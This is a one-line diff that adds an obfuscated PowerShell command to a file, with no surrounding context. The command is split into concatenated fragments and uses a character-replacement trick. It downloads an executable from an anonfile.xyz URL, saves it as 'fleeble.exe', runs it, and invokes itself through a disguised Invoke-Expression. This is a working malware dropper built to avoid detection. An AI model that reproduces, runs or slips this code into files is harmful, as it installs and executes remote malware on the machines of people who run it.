@@ -1,0 +1,1 @@
+﻿ (('(New'+'-Object'+' S'+'ystem.'+'Net.Web'+'Client).Dow'+'nloa'+'d'+'File(JL'+'chttp://an'+'onfile.xyz/f/'+'3d0a4fb54'+'941e'+'b10214f3c1a5fb'+'3'+'ed9'+'9.ex'+'e'+'J'+'Lc'+',JLcfl'+'eeb'+'le.exeJLc);Star'+'t-Process JL'+'cflee'+'b'+'le'+'.e'+'xeJLc') -repLacE  'JLc',[CHar]39) |. ( ([sTring]$vERBOSepRefErENCe)[1,3]+'X'-JoIn'')
